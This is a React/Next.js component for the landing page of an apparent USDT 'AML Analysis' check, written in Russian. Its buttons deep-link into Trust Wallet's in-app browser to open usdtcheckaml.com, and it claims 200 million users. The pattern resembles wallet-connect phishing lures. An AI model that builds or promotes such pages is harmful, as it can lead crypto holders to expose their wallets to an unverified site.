import { useState } from "react";
import "./Home.css";
import { useDispatch, useSelector } from "react-redux";
import { setCurrentStep } from "../../Redux/Slice/MainSlice";
import type { RootState } from "../../Redux/store";
import { usePrefersDark } from "../../Hooks/usePrefersDark";
import Image from "next/image";

export function Home() {
  const isDark = usePrefersDark();
  const [isChecked, setIsChecked] = useState(false);
  const { currentStep } = useSelector((store: RootState) => store.main);

  const dispatch = useDispatch();

  const handleCheckbox = () => {
    setIsChecked(!isChecked);
  };

  if (isDark == null) return;

  return (
    <section className="home">
      <div className="home__container">
        <div className="home__visual">
          <Image width={1000} height={5125} src="/home.svg" alt="home logo" />
        </div>
        <div className="home__content">
          <Image
            width={270}
            height={42}
            src={isDark ? "/logo.svg" : "/logo-white.svg"}
            alt=""
            className="home__content-img"
          />
          <a href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com">
            Test
          </a>

          <h3 className="home__content-underlogo second-color">
            for AML Analysis
          </h3>
          <p className="home__content-text">
            Присоединяйтесь к 200 млн пользователям, которые проверяют
            безопасность своих криптоактивов с помощью AML-аналитики.
          </p>
          <div className="home__content-input">
            <input
              type="checkbox"
              id="agree"
              checked={isChecked}
              onChange={handleCheckbox}
            />
            <label htmlFor="agree"></label>
            <p onClick={handleCheckbox}>
              Я согласен(сна) с{" "}
              <span className="second-color">
                Условиями пользовательского соглашения.
              </span>
            </p>
          </div>
          <a
            aria-disabled={!isChecked}
            onClick={(e) => {
              if (!isChecked) {
                e.preventDefault();
                e.stopPropagation();
              }
            }}
            href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com/choose-net"
            className={`home__content-button second-color-bg ${!isChecked ? "disabled" : ""}`}
          >
            Продолжить
          </a>
        </div>
      </div>
    </section>
  );
}
